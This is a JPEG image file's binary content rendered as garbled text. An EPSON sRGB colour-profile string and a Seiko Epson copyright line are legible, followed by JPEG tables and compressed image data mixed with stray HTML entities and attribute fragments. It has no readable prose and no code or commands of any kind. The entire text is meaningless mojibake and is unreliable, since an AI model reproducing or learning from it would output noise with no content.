√Ç,√ÇK√Çj√Ç‚Ä∞√Ç¬®√Ç√á√Ç√¶√É√É$√ÉC√Éb√ÉÔøΩ√É&nbsp;√É√Ä√É√ü√É√æ√Ñ√Ñ&lt;√Ñ[√Ñ{√Ñ≈°√Ñ¬π√Ñ√ò√Ñ√∑√Ö√Ö6√ÖU√Öu√Ö‚Äù√Ö¬≥√Ö√í√Ö√≤√Ü√Ü0√ÜP√Üo√ÜÔøΩ√Ü¬Æ√Ü√ç√Ü√≠√á√á,√áK√ák√á≈†√á¬™√á√â√á√©√à√à(√àG√àg√à‚Ä†√à¬¶√à√Ö√à√•√â√â$√âD√âd√â∆í√â¬£√â√É√â√¢√ä√ä"√äA√äa√äÔøΩ√ä¬°√ä√Ä√ä√†√ã√ã √ã@√ã_√ã√ã≈∏√ã¬ø√ã√ü√ã√ø√å√å?√å^√å~√å≈æ√å¬æ√å√û√å√æ√ç√ç&gt;√ç^√ç~√ç≈æ√ç¬æ√ç√û√ç√æ√é√é?√é_√é√é≈∏√é¬ø√é√ü√é√ø√è √è@√è`√è‚Ç¨√è&nbsp;√è√Å√è√°√ê√ê!√êB√êb√ê‚Äö√ê¬¢√ê√É√ê√£√ë√ë$√ëD√ëe√ë‚Ä¶√ë¬•√ë√Ü√ë√¶√í√í'√íG√íh√íÀÜ√í¬©√í√â√í√™√ì
√ì+√ìL√ìl√ìÔøΩ√ì¬≠√ì√é√ì√Æ√î√î0√îP√îq√î‚Äô√î¬≤√î√ì√î√¥√ï√ï5√ïV√ïw√ï‚Äî√ï¬∏√ï√ô√ï√∫√ñ√ñ;√ñ\√ñ}√ñ≈æ√ñ¬ø√ñ√ü√ó√ó!√óB√óc√ó‚Äû√ó¬•√ó√Ü√ó√ß√ò√ò)√òJ√òk√ò≈í√ò¬≠√ò√é√ò√Ø√ô√ô1√ôR√ôs√ô‚Äù√ô¬µ√ô√ñ√ô√∏√ö√ö:√ö[√ö|√ö≈æ√ö¬ø√ö√†√õ√õ"√õD√õe√õ‚Ä†√õ¬®√õ√â√õ√™√ú√ú-√úN√úo√ú‚Äò√ú¬≤√ú√î√ú√µ√ù√ù8√ùY√ù{√ù≈ì√ù¬æ√ù√ü√û√û"√ûD√ûe√û‚Ä°√û¬®√û√ä√û√¨√ü
√ü/√üP√ür√ü‚Äù√ü¬µ√ü√ó√ü√π√†√†&lt;√†^√†√†¬°√†√É√†√•√°√°(√°J√°l√°ÔøΩ√°¬Ø√°√ë√°√≥√¢√¢7√¢Y√¢z√¢≈ì√¢¬æ√¢√†√£√£$√£F√£h√£≈†√£¬¨√£√é√£√∞√§√§4√§V√§x√§≈°√§¬º√§√û√•√•#√•E√•g√•‚Ä∞√•¬´√•√ç√•√∞√¶√¶4√¶V√¶y√¶‚Ä∫√¶¬Ω√¶√ü√ß√ß$√ßF√ßi√ß‚Äπ√ß¬≠√ß√ê√ß√≤√®√®7√®Y√®{√®≈æ√®√Ä√®√£√©√©(√©J√©m√©ÔøΩ√©¬≤√©√î√©√∑√™√™&lt;√™^√™ÔøΩ√™¬§√™√Ü√™√©√´√´.√´Q√´s√´‚Äì√´¬π√´√ú√´√æ√¨!√¨D√¨f√¨‚Ä∞√¨¬¨√¨√è√¨√≤√≠√≠7√≠Z√≠}√≠&nbsp;√≠√É√≠√•√Æ√Æ+√ÆN√Æq√Æ‚Äù√Æ¬∑√Æ√ö√Æ√Ω√Ø √ØC√Øf√Ø‚Ä∞√Ø¬¨√Ø√è√Ø√≤√∞√∞8√∞[√∞~√∞¬°√∞√Ö√∞√®√±√±.√±Q√±t√±Àú√±¬ª√±√û√≤√≤$√≤H√≤k√≤≈Ω√≤¬±√≤√ï√≤√∏√≥√≥?√≥b√≥‚Ä¶√≥¬©√≥√å√≥√∞√¥√¥6√¥Z√¥}√¥¬°√¥√Ñ√¥√®√µ√µ/√µR√µv√µ‚Ñ¢√µ¬Ω√µ√†√∂√∂'√∂K√∂o√∂‚Äô√∂¬∂√∂√ô√∂√Ω√∑!√∑D√∑h√∑≈í√∑¬∞√∑√ì√∑√∑√∏√∏&gt;√∏b√∏‚Ä†√∏¬™√∏√é√∏√±√π√π9√π]√πÔøΩ√π¬•√π√â√π√¨√∫√∫4√∫X√∫|√∫&nbsp;√∫√Ñ√∫√®√ª√ª0√ªT√ªx√ª≈ì√ª√Ä√ª√§√º√º,√ºP√ºu√º‚Ñ¢√º¬Ω√º√°√Ω√Ω)√ΩM√Ωr√Ω‚Äì√Ω¬∫√Ω√û√æ√æ'√æK√æo√æ‚Äù√æ¬∏√æ√ú√ø√ø%√øI√øm√ø‚Äô√ø¬∂√ø√õ√ø√øXYZ descEPSON  sRGBEPSON  sRGBEPSON  sRGBtextCopyright (c) SEIKO EPSON CORPORATION 2000 - 2006. All rights reserved.√ø√õC
	
#!!!$'$ &amp; ! √ø√õC                                                   √ø√Ä
	√∂"√ø√Ñ	
√ø√Ñ¬µ}!1AQa"q2ÔøΩ‚Äò¬°#B¬±√ÅR√ë√∞$3br‚Äö	
%&amp;'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz∆í‚Äû‚Ä¶‚Ä†‚Ä°ÀÜ‚Ä∞≈†‚Äô‚Äú‚Äù‚Ä¢‚Äì‚ÄîÀú‚Ñ¢≈°¬¢¬£¬§¬•¬¶¬ß¬®¬©¬™¬≤¬≥¬¥¬µ¬∂¬∑¬∏¬π¬∫√Ç√É√Ñ√Ö√Ü√á√à√â√ä√í√ì√î√ï√ñ√ó√ò√ô√ö√°√¢√£√§√•√¶√ß√®√©√™√±√≤√≥√¥√µ√∂√∑√∏√π√∫√ø√Ñ	
√ø√Ñ¬µw!1AQaq"2ÔøΩB‚Äò¬°¬±√Å	#3R√∞br√ë
$4√°%√±&amp;'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz‚Äö∆í‚Äû‚Ä¶‚Ä†‚Ä°ÀÜ‚Ä∞≈†‚Äô‚Äú‚Äù‚Ä¢‚Äì‚ÄîÀú‚Ñ¢≈°¬¢¬£¬§¬•¬¶¬ß¬®¬©¬™¬≤¬≥¬¥¬µ¬∂¬∑¬∏¬π¬∫√Ç√É√Ñ√Ö√Ü√á√à√â√ä√í√ì√î√ï√ñ√ó√ò√ô√ö√¢√£√§√•√¶√ß√®√©√™√≤√≥√¥√µ√∂√∑√∏√π√∫√ø√ö?√π#'`√ß√∞¬©¬£r#√Ç√≥√≠P¬ª√ñ≈∏m|√ó√™‚Äù√óc√è‚Äô√ê‚Ñ¢¬®√ùÔøΩ‚Ä∫=+Z&lt;¬ªY√Å2c&amp;¬≥K√®09¬´√†&nbsp;W=¬´¬≠;√ô3≈Ω¬Æ¬©\≈°uS√¶¬∑N‚Ä°√í¬§‚Ä∞ÔøΩr√•√ü¬®5√ä√•sÔøΩjKd√ö0√åG¬•S¬≥L√§v√ú{H¬°√°‚Ç¨y"‚Äòd#√•(√èf;:2¬∏≈æ‚Äù√á‚Äö‚Äú√äq‚Äô¬º√ñi√áb.¬∂!rY√∑ √ö=G¬≠;√ãu$¬≤‚Ç¨=h!U‚Äû√•s√ê√î√ìy¬≤Zp:√µ√ÖV√ö&amp;;√¥#0-√ï‚Äπ¬º
S¬æ7`‚Äô¬£¬µE*√¢=√ô*1≈†≈°Vx√ê¬≥)RF9√ØM√Ö¬≠[√òD%‚Ä†√ê√õW9 ≈æ√¥√ë√ª¬∑√Å√ÉNh√î¬≤;ÔøΩ¬´≈í≈íRJYS√Ö=FT¬¥&nbsp;‚Ä¢√õ√Ö1√ã¬§ÔøΩc√†g¬≠H√†oQ√¶√∑¬¢*√Ö√âÔøΩOJQ-
cd√á$∆í√ñ‚Äù3G.rKg¬ß¬µ+9‚ÄôrE1e3√ò√ª¬Ω√™¬µ{‚Ä†¬¨¬∞.ÔøΩ&nbsp;u√ò:√Ω√Æ√µ\\2√°2ZIgo,‚Ç¨8√èZ¬™¬¢R√É$ÔøΩ√ò√ìT√ñ√•√Ü)√™√ç	&lt;&nbsp;K‚Ç¨A=‚Ä¶W√§H√Ö‚Ä†≈ì√Ωi¬¶I7ÔøΩ≈ìÔøΩZ‚ÄôB$√ö√é√É≈æ1√©I+n$¬¨+√ä&lt;√Ä¬°¬æÀú√≠I!R√†n√≠√è¬Ω0D√åÀÜrE1√ï√ît$√∂5V]‚Äô¬πf√≤≈Ω√¢^‚Äù‚Äò¬≤y≈í√Ä√§‚Äú√Ü{√êB#lL¬≥¬π&nbsp;¬¨k√æ¬±~¬Ω*t¬±‚Ñ¢6H 0¬®‚Äπ‚Ñ¢1√§¬æ:√î,√é√í&nbsp;2TÔøΩ¬∏_‚Ñ¢GN√û¬¥√πm√ê|¬∂W&nbsp;¬∂√ë&amp;w√è&gt;√µX6c¬•69√≤√åH=	¬¶#og√πGVvd;¬Ω√Ö"1ÔøΩ√É{≈†‚Ä¶√¢√û7≈ì¬πÔøΩÀÜ√é√•¬¶9√Ω√¶√Ä¬ß√¥¬≠b√ñ√∫¬Æ√§@¬®I8√Å"ÔøΩ√Ü√Ñd+ÔøΩ√úNgT@|√á√ö¬´¬±s&amp;√∞8¬§‚Äôz¬µ√ú‚ÄìPLÀú¬∑z√≥W√ö¬ªH√æ√É&amp;¬®	c√†¬ß√û√á5e√ö&amp;¬∂√Ç≈ì¬±√í‚Äô¬∂‚Äö‚Äôz√£_5‚Ñ¢X√∞¬ß&nbsp;√®i‚Ç¨√ãÔøΩ
√ßUÀÜÀúEr¬º≈°g√â‚Äô¬πnMR‚ÄîcD√µ,√Ç√É`m√∏^√ã√ØK4*¬§‚Äì9≈°¬Ø√ã√ç≈í≈í√ï5√Ñ¬¨QJ&amp;j‚Äî¬πÔøΩ¬µ√êÔøΩ%_1√Ω√¶i√´	3¬∞,sM√û)√Éw"‚Äút¬π√ÇÔøΩ∆í¬•	1¬±2√±‚Äöz√ªT√Ä∆íf√¥¬¶√°|‚Äú¬¥√§¬ØsL√≥YG&lt;√£¬≠1j√Ñc√•!!¬∞√Ñ√ß4√à√¶-≈∏6B√ç√ò‚ÄúSL≈∏¬ª‚Ä¢n≈ìUx√älo‚ÄîsSJ√®¬•¬±4{ÔøΩ√Üw√Å¬•‚Äô
√ä√ç≈ì‚Äò√âZH√ë∆íc√ó¬∑¬•Xx2[
¬¥√£¬°=i7g¬°7¬≥√ê¬™≈Ω‚Äò‚Ä¢ÔøΩ¬™v‚Äù√¨√Äc¬≥9 UtÀÜ3¬±^{b¬•"*Fx5-+√™7k‚Äî"h√ôÔøΩ/√óÔøΩ‚Äú√í¬ø@~√õ%¬ß√Ç√Ω(√é√†`
≈∏Z√º√∏‚Ä¶z‚Äìa‚Ä¶√Ö~ÀÜ√º2‚Äû√Å√∞√èCÔøΩ¬π?g^G√í¬æ[ÀÜ4¬•¬ªÔøΩ√πz√∑√ô√ò2eÔøΩ√é¬ß≈í¬§sJ2N1ND√â√±g¬∏,i¬µS¬∞{√íÔøΩJu!‚Äòp:√ì√ä√ß√í‚Äù√á√∞√íÀú4√ë√âlsR¬∞√£≈Ω¬¥‚Ä¶√©@√éA√≠B¬¶√ì√í¬§√ÜiPYTÔøΩ¬¶?‚Ñ¢‚Ç¨√è4¬§¬±‚ÄúqR√ú√ìq‚Äû√¢‚Äú≈†p√Üq≈æ)1≈í‚ÄòH¬∑√ù¬¶ÔøΩ√ò√â4√∞√Ö‚Äî8√Ö!RO¬µ
¬π√â¬®√û r¬£≈í√µ¬´¬∫√ì_&nbsp;(;S√∞¬¨√Ä√∑¬™≈ì‚Äì√Ü	¬°‚Äîg"‚Ç¨Fj'√à{w¬©ÔøΩ√à√©M‚Äô2√£√≥@‚Ä¶N3√ö≈ì√©√ç*√•@R8√µ¬¶¬ª0ÔøΩ&gt;Q√ñÀú‚Äû√Ü:√µ‚Ä¶‚Äπ√πiep√û≈æ¬™0¬§1¬•q≈°gv[!√ÄaN√™=iÀÜÔøΩi√©≈æ*&amp;‚Äπy∆í≈°¬∞T√∫√í√£≈†.C≈æ√ò¬°ÔøΩ0√Ö&lt;√†JA≈†C!√öQ√á9¬ß√µ√Ö&lt;√£≈°A√à√é(¬º‚Ç¨8¬ßÔøΩAM\\s√ñ‚Ç¨H√á√ñ≈∏≈æ=√©6∆í√îqH`√Æ√à√¶≈ìS$cÔøΩZv4∆í√Øu√¢ÀúFÀÜ6√ß≈æ√µ&gt;q√ö‚Ä∫¬≥≈æ(¬©√áQB√ôc¬§:√±Dg=¬®
ÔøΩ√π&lt;√ê¬§g≈ìy8¬®≈∏7
i≈ì/√≠N√öi¬™q√Å¬ß√ç#e√Å¬Ω76√Æ√ï6z√í√∞FV*[‚Ä∫¬ΩM≈í√∞jcÔøΩ¬°!¬∞GJ[}√≠√ç√∑¬®√≠‚Äù‚Ä¢Fy'&amp;‚ÄòÀÜ-¬∑4√µ\√É≈æ‚Äù`t¬•l√í($√ªP≈Ω0i¬ª}iO≈æ‚ÄöÔøΩ√≥&gt;√¢‚Äûb√á≈Ω√¥√¢)√ªp√îc≈ΩiÀÜ‚Äπ'¬µ&amp;√ûA=i√§s≈†B1@√à√§‚Ä¶%√Äzv√ê¬£¬•;¬©√ç+c‚Ç¨¬≠ ;¬∂≈Ω¬ß√í≈æ‚Äò‚Ä¶√è4`√π‚Äû√æU  ≈°`0&amp;√ì√Ö.9√¶≈∏√ÜN√à√∑&nbsp;√≠{√îR‚Ç¨`√≤jnK)¬¨‚Ç¨¬∞=√®@√ÑT√à√πÔøΩ@√ë*√äGZ¬∑√ëM4.√Ø√Ç‚ÄûEUr≈Ωi√£'&nbsp;)4√¨w√≠H#=*2‚Ñ¢q¬∏p:T¬§~QA√â^8¬¶@
1‚Ñ¢ÀÜ;M&lt;|√Ä‚Ä†=hH‚Äö≈Ωi‚Ç¨√ò‚Ä¢‚Äö√°¬π¬ß√≠√£¬•9W√É¬∏6;P9√ß≈°f√ç√á$*B0rOZ√±≈íR^√¥2√•zsNQ√á)I√®≈†¬π√∂¬•U<q¬∑√í‚ÄùÔøΩ≈í√úkt√¨*n:b≈ìq≈†ls@ a√πr√£¬Ω?√ó≈°oe="">√î√ñR~Z@‚Ç¨1√í¬•\0√ç!#8‚Ç¨`"≈íc¬•8q√í≈íÔøΩ√ñ‚Ç¨+‚Äì*z√∂¬ß¬¶Je¬∫√í‚Ä¢√ü4≈æ√ù¬©ÀÜR9√ç9s√©J8√Ö≈æ¬∏¬°cqI¬∞‚Äò≈∏Z~94≈ì√£√ö‚Ç¨¬∞g‚Äú
i√åHZ6√º¬∏√Ø@tf\≈†U\(√¶‚Ä†√©≈ìP¬§‚Äù√Ñ)SsO√Ä4≈í&nbsp;√∞(¬∞√Ü7√ú¬®≈ì√º¬∏&amp;¬¶)‚Äù√áJ¬Æ√±‚Ç¨ÔøΩ3√¢?√ö#l≈∏¬ÆP¬πR"Q‚Äö+√Ü‚Äò3H √µ√µ√≠_¬¥‚Ä¢¬≥E√±VI√ä‚Äô¬≤√Ç¬∏9√©^*¬ª‚Äì@√Ñ‚Äò≈æ
~‚Ä∫‚Äî¬∫√Ç√ùÔøΩ‚Ñ¢√Ñ√ü√ö√àt¬≤}√ê~a≈ìL.&nbsp;*√£√ò√ì√ä	%√ö¬´√è¬Ø¬•5\√è√û¬Ω¬ª≈ì√ö"¬µ√≤≈ìRÀÜ√ïU[¬Æ{√íPt√èjM¬ß√ñ¬Ø¬¶‚Ä¶√´m	DlN√≥√ågÔøΩ¬•Bc‚ÄìBU¬∞@√®jh√ô≈ì√£8C√õ√ñ‚ÄôVK√•¬®√Ä√µ¬¶$√òÔøΩ√òC√•‚Äù-0‚ÄîR;√Æ√ß‚Ä¢)Pc
√∫√î√öW√ö¬¨:√ï%}AjYB¬≤¬ª√Ä^y√ØB√úÀú√ób√¥99¬¶|‚ÄöN1J¬™≈†√ªK√ê√ï√â√ê¬¨√å#h√â√≠Nw1√É∆í√≤‚Äô1≈°YÔøΩxPX1√Å¬§fV≈í√Æ0√§f‚Ä∫√ñ√ñ5Dp0‚Ä¶√ä¬∏¬©T)^I√∫j√πNA√õ√≥√ñ‚Äîiv‚Ä¶2√úoQ¬π9;Àúq√êT√§ÔøΩ,√áj‚ÄöD&gt;b	√≤M#4`¬°‚Ç¨¬™¬≤√ê‚Äî¬≠¬¨mFI‚Äöi‚Ä∫√±√ïKzR02`d:√ì√ï¬©'√ê√î¬±-¬µ+‚Äì*J√Æ*	√£√Ø‚Ä∫hC√êt√èjK¬º≈ì‚ÄìG}√ÖUy
S]‚Äπo¬∞√∞√Ø√ñ√©Q¬æ√ó‚Äú¬Ø$√¥√≠HHa√ú≈íH√§T√ò‚Äù‚Äπ1D√Å√à^√ØD√¨
C})√†#5√åÔøΩ‚Äù‚Äú√í‚ÄôVd√ô√û√¨wÀú√ë¬¶√£√ê√∞)≈ì(√âq√≥v¬§√ü√àB√ô≈æ‚Äù‚Ä¶r¬§√º√ïI‚Äîro3√∑≈†√ë√Ü‚Ä°z‚Äò≈†≈ì1√ú:≈†¬®¬≤2ÔøΩ¬π√é=*√ÅÀú¬¥aB}√Æ√æ‚Äù√•¬¨L¬¢B?x√çÔøΩ¬∑u¬•‚Ä∞Jq¬¥q√î≈†k¬∑‚Äì√Å"'¬Æj√öac√ãÔøΩ√´√µ¬°√®¬¨‚Ä°'dQI‚Ä∞wS√êt¬ßÔøΩ¬≤:√º√úw¬ß\‚Äö2;c¬µ1√î¬§‚Äπ√áh¬≤oB¬¥¬æ‚ÄöÀú√πo√û¬≥√ö¬§c¬∂M¬£≈ì√º√åi≈†¬™w¬¢√´‚ÄúIÔøΩ√à‚Äö3√Ä√¢‚Ä°¬ΩÔøΩ√üÀú√∏v‚Ñ¢¬´gw:FQ¬∫N;√ìF(√∏\ÔøΩ21K,.√ä¬¨√åA&lt;√±Y6¬Æf√µ`∆í,HN3√èH√Ö‚Ç¨ q≈†~ZD√ò≈íp¬æ√µ√≤√Å√Ç)√ü√ú√ìKPC≈†¬∏ÔøΩJ¬º√ß=¬™o(yE¬∑√µ√§≈°‚Ç¨√é√ÜEFo√ù¬®√©R6C¬®C√ó√¥¬•fk¬Ø‚Ñ¢¬≥6pz{SKUÔøΩ√ã√à≈†‚Äù¬∞c√ü√´QbC)e#¬æ‚Äù'√êh¬™√ÆC√Ç¬ØAO\‚Äùe‚Ä¶√æ√©√ØP√ôrX√ß&lt;√±R√π≈∏"
¬Ω*≈°¬æ&nbsp;√ób8√å√•√ä¬£¬®√µ&nbsp;¬°‚Ç¨o√¢√ç=¬§`Q‚Ç¨√èozl‚Äò¬™¬≤¬≤¬π!‚Ä†M$¬ª‚Ä¢√î"√≤√ÄaÔøΩ¬¶ÀÜ‚Äû^a√Ç√ß¬±√ç#)1w √∑√ÖN√¥√ñ¬®-¬¶√§‚ÄôFL√ª‚Äîp√á√Ü¬•ÔøΩ√§b8lv'h$‚Äô;ÔøΩJw√Ø√á¬©¬°¬´√ô‚Ä∞√©¬π|ÔøΩI√¨i√±‚Äô√ÄN}j¬∏‚ÄôA)ÔøΩfA√Æjr√ë‚Äù√ânT√¥¬™√•4j√Ñ√≠‚Äú‚Ä° d√´P√ã$∆í‚Ç¨i|√ü0@√á√îQ‚Äùf$J√£T¬•m√âK¬∏¬•√äa¬∞K√Å¬ß√ä#‚Äú√¶'√Ä√µ¬°K$ ¬™‚Äö{f‚ÄôI`√ó‚Ä¢√∫R/&gt;@ÔøΩ6√¥&lt;})√ç"¬£T√ß9√ÖYÔøΩc1¬∑i<tgildw¬ßu¬∏s.√Å$8|√≠'‚Äò]¬ø√Ç√©l√¥gf'√∑√™8√Ø√Öq√ç‚Ñ¢√û09√à¬Æ√ó√°≈í-s√±cbÀÜ√ö√§}kÔøΩ√øÔøΩu ft="">4~‚Ä°√Öx√∑3rGJ¬≤¬©¬µ0;S"R5&amp;O√°_‚Äî\√∫T‚Äû‚Äú≈ìS∆ín=)√â√à√ç+.√û@√â¬•q≈í "¬£u;√Ü:T‚Ä¶x4√¢‚Ñ¢'≈°h@‚Äπ‚Äû√´MH√ôe,NsR"ÔøΩ¬ΩzS√∂ÔøΩ√éÔøΩ√à√à√â√É
‚Äπ√äA'C∆íVYyv¬¶‚Ä¢√ù√Ö4P¬ºTq≈ì1ÔøΩjP≈ìm4,d0√èjWÔøΩB¬£*/^√î√ç≈Ω¬£¬´q!8¬§eb√Ä≈†¬´≈†√Ñ{|¬ß≈†P√¢¬¶√ò7z√í‚Äò‚Äú√áj‚Ä∫≈Ω√ÖfpC≈∏\√î‚Ä¶r¬ºu¬©J≈ídRt¬¢√†B‚Äò√πi≈Ω√¥¬±√Üq‚Äì√´S¬∫‚Äîh'¬≠b¬©‚Äû≈ΩGzP‚Ç¨19√¢‚Äúh4\,UGq);RÔøΩ√ã"‚Ä†√¶¬¨√Ü3√ñ‚Äîo√ç√à√ç
‚Ä∞!¬§dScS√Ä'9¬ß¬®√Ö+≈Ω√ÑG√•√Üi√∏ÔøΩ/√ñÀú√Ñ√∂¬°¬£∆íU¬•?¬ø√ô'√ùn‚Ä¢(g¬®e$√é¬£n√¨√æ‚Ä¢Bd√•p?Zdo¬Ω¬∑¬∫jl√†`≈†b¬™‚Ä¶<b‚Ä¢√áa√é¬π√Ü)h √£¬µ2f="" `="" ≈°w¬†‚Äôn;√í√•p√¥¬©t|¬π√áz@¬´h\r‚ÄπÔøΩi&ÀÜ√Å¬≤¬∑n‚Ä¢*¬±u√â¬ßl{√ì¬∏‚Ä¶√Ä√Ü√üz¬´r¬≤#n√µan="" √à¬¶8-*¬≤‚Äò‚Äò√ö‚Äû√ÅÔøΩzb9ÔøΩvÔøΩ*√à@√Ä√Æjs√Üy√í‚Ç¨bÔøΩe√Å≈Ω√§o¬∫v√í="" √ù¬∏wv="¬™√ìcn¬§√ò√¥¬•p+¬§Q‚Ä∞" .[xÔøΩ√´j‚Äò*1#¬Ω;$‚Äò√Ö;ÔøΩ3ÔøΩ√ö‚Äû="" √¶o√Ü)√¶#¬∏0¬©6√Ä√ßÔøΩjÔøΩc√¶‚Äöz‚Äù√†≈í="" i‚Ä∞o="M!r">¬¥¬±ÔøΩ√ë√º√á√∞¬©Caq√Ö6?-[`o√à
ÀÜH
0U<u¬≥‚Ç¨*'√á¬µ$2¬∏.@= xÔøΩhk{="" p]√ùeÔøΩ1t3n="i6ÔøΩ3p_√Ü¬ß" ;r="" d√†√ß¬©="" +√çÔøΩ‚Ä¶¬±≈°¬´ÔøΩ!√µ√©≈†√ë="" ≈ì="" pt√ß√ë`+$d√§h9¬ß√πb<t√é9s≈†n\pb¬±√π≈†x‚Ç¨{t≈í¬ª‚ÄùÔøΩ√©h`\√ß=":T‚Ä∫">Z`U‚Äö-OL≈æ¬∏¬§u(p√à√¨Y#b√º¬´H¬®_√¶qH
√ñ¬±B√•6g¬¶i√≤0R‚Ä∞¬ª≈∏Z¬∂8¬™√ó√º√ª‚Äî9¬™¬∏‚Ä°2r8√ß√ñ≈æ√ë√§n<b‚Ä¢‚Ç¨¬°¬π√£≈°‚Äù√£‚Ä†v√ÄÔøΩ√Üj\9¬§ÔøΩ‚Äö1≈Ω 5ÔøΩ‚Äô8√ÖÔøΩe="" √πÀú¬∑="">‚Äö¬•ÔøΩ¬§2√¢Àú#`√†‚Äú‚ÄòVv√±@≈†¬¨≈í‚Äû`f¬°GÔøΩ\√àY~^√Ü¬Ø#≈æ¬¶Àú√£ ‚Äö(¬∏√ä√Åc#√â¬¶‚Ä∞¬ßy≈°//j≈íU√•T√©HI√ì¬∏≈†≈Ω≈∏8s√î≈æ‚Ä¢p√ß√ã8√´MdÔøΩ√á!√†P`bg¬≠Ut√≥≈æ¬¢¬¨√£?{√∞¬¶¬™ÔøΩ√ô√áÔøΩ≈íTO,≈Ω√ù√≥H&nbsp; √Ç√≥≈Ω‚Äö¬•eR‚Äû√Ö"¬±d√ì@G¬±fy√ì√ò¬™≈Ωz≈°ÔøΩ%i\¬Æ6≈†‚Äò√±≈í7ZM3¬•≈ΩF‚Äù‚ÄìÔøΩ√í¬§¬∑-¬º√øw√ì¬Ω\	ÔøΩ23Q√ånX/√≥Ot¬±)\√¢¬£‚Äòx8√†√î¬ºm√è¬≠F√ã√≥n√éj
 )‚Äò√à√≠U‚Äû+	√â8&amp;¬Ømm√ô=)¬≤√ÑA#4‚Ç¨¬°:‚Äì‚Ä¢
≈í√£¬ø¬•9¬¢`O ≈ìt¬©e[`\ZaRfbÔøΩ¬£Vw¬Ø≈ìcf√â√π¬´2ÔøΩ¬£¬∑Zn√ê√§√£≈Ω‚Äù√ètbr‚Ç¨{√ëV6‚Ä¶8√é√Ñ~R≈í∆í¬¥√±O√´√Ä√ªT√∑√ëy7[
√°¬∫‚ÄòDc√•√ú¬™3√ê√ó√´√¥ZS‚Äì‚Äî$¬∑≈í√à√õT√≤9√çk¬®√≥V2√Ä‚Ä†¬´.xx¬´√ó‚Äö
h√ÄIRe;x√†
√ù¬´¬´≈ì5¬Æ√ôf(√íIÀÜ't√èz≈∏√§0¬Æc√ï¬π#¬ΩPVeq‚Äì√¶¬¨√ápc&amp;√¨n=1G+9d‚Ñ¢*√å¬´+rQ‚Ä°T/¬∂A√≥h‚Äù√Ü¬Ø√≤≈ì‚Äì=)¬•‚Äô¬∞√¥¬™√ëjJ]DX‚Ä∫rÔøΩ&nbsp;&amp;z√î¬©!kÔøΩ/8NÀú¬®√ú√â√•√£!v√±≈†&lt;‚Äπ‚Ä¶‚Ä¶&amp;‚Äò2ÔøΩ‚Äô¬ß√ñ‚ÄπueZ√¢4e&amp;√≥`ÔøΩJ|√íc-#e¬≥√ü¬≠@√å√™X¬ØF√≠√©I¬ΩÀú√á8√†√ï√ò¬´u'√ªRÀÜ√ä¬∞√ú√ù¬™$WG√µ√èz`]¬≤*¬≥@√´√©S¬∂8√òw√µ¬•¬≥¬≤¬¶√Öi‚Ä∫√¶(&gt;√∏=√®‚Äû¬ø‚Äù√õ¬∏bz√ïÔøΩ,H√Ö¬≥‚Ä†√∑√ú√â'√≤¬´RMX|√ä√ñ,√ÄI¬µ‚Ç¨<c√ñ‚Ä∫¬±¬°√ä∆í√∑‚Ä°j≈°w‚Äù.√Ö≈°¬Æ‚Ä¶√à√ã≈æ√¥‚Äú)6√ê√∞¬¶8√áÔøΩ¬®√ï√π tÔøΩ√ØvÀú¬ø‚Äô@ÔøΩh="MV√≤a]@*‚Äì¬¨¬´RE‚Äò‚Äî\‚Ä†√©√õ" @√é‚Äôa8¬´="" Àú08√Ö1c√Ñ8¬ß{¬Ω="">√Ñ¬©Àú√πhs√´UZ"¬∏p&gt;b{√ñ≈†N#‚Ç¨√π‚Äπ‚Ä°#¬°¬®"‚Äùf√ûA¬¨√µ√ï‚ÄúKQ¬π‚ÄúzÔøΩ‚Ñ¢&gt;√î√ñÔøΩ√ù√É7j¬∞¬≥0√Ñ√ì√ÑÔøΩ#¬Æs√Ä√∂¬¶‚Ä∞¬πLo‚Ä¶√æR=¬™`√≠√¶+(¬¢¬•H√∑ÔøΩv√≠#¬ΩD√Å√ã¬ø√µ¬´√¶¬æ‚Ä†‚ÄîLY\¬æ√Ä√â√Ä8√Ä`Aj≈†'@≈∏2‚Äö√û¬æ‚Ä¢$¬≤¬°u,¬π√£≈†‚Äπ6C√¨A#√§
8dE‚Äì√éz√î√ª¬£*¬ª‚Ä†X√∂√í≈∏6√†H√∂4_&nbsp;st%gBx#√î√ë'B¬Æ[√õ¬•6FUB≈ìÔøΩN√µ √ä&amp;√µx¬•{√å¬Æ#Q√âM¬ß√õ¬ΩO‚Ä¢√≥r¬°})¬•e`¬Æq√îR9p√ëÔøΩ‚ÄìS√ó¬©√™√á{‚ÄôHP≈æ^Op*G2≈∏‚Äî*GoJ‚Ä¢√ï‚Ä∞x¬≠?ÀÜ¬£√°ÀÜ√è&nbsp;¬©¬Ω¬∂vDq√âj@ ÔøΩ√ñ‚Äôm¬Æ|¬®≈ì√≠√≠≈°‚Ä∞QVCÔøΩ‚Äù7B{UÔøΩ‚Ç¨√®√™√ÅÀÜ√†≈ít¬™k[ÔøΩ√ôj%¬µ¬±ÔøΩ‚Ä∞v√à√Ü8¬§‚Ä¢Àú#(S√Å√†≈°¬≤¬∑HC'√ì¬±¬®≈ì¬±√Å^√¢‚Äôn√∑d√ù¬∑y
I	≈í)‚ÄòM"√°¬∏'‚ÄòR*¬©s‚Äö√ë√Ö0&lt;√ÜE8¬π¬¶Àú√ï‚Ç¨\ÔøΩ,‚Ä†C√¥¬•‚Ä∞√î√™¬ºw√çK¬≥02ÔøΩ2√ñ‚Äô0‚Ñ¢(PÔøΩEK&nbsp;¬Æ¬∫√≥%√ù√à √±V¬∑¬∑‚Äú¬º¬∑J≈í¬¢√£*s≈†|L√í≈ì,ÔøΩv√≥∆í√í¬•√≠q=H√Ñ‚Ä¶√®3V¬∂&lt;‚ÄòÔøΩ√ú√©U%√éO‚Ä¢<r>√Ödc√á/]D√ñ√år(7√Ö√æ!√∑‚Ä°Z√Ω√∞-‚Ç¨√¥X√òE¬™p&gt;‚Äö¬ø<tÔøΩ'√ñ`ÔøΩ‚Äî{√â"¬™ÔøΩ¬©¬Ø√í √ò√öx{o¬∂#\1√øÔøΩ√≤|c="" v="\¬πj√ô¬™√éZ‚ÄòZb√†≈æ≈ì√î¬£+√£√èhs√ñ≈ìG8¬£‚Äî≈°@" √π{sb√§≈æix√õ√ç8)z√¶≈ì¬ºÔøΩh√õg-√ö≈Ωh√πx¬†ry¬£√∞i√ò√Ä¬§yÀÜ¬ßre5√∂‚Äö√´nul√ß<snm?√áf@="" ¬Æ√Æy¬ß√Ø√¢ÔøΩ="" nÔøΩ:√ì√á‚Ä†py√©@="">¬¥‚Ä†√µ√ß 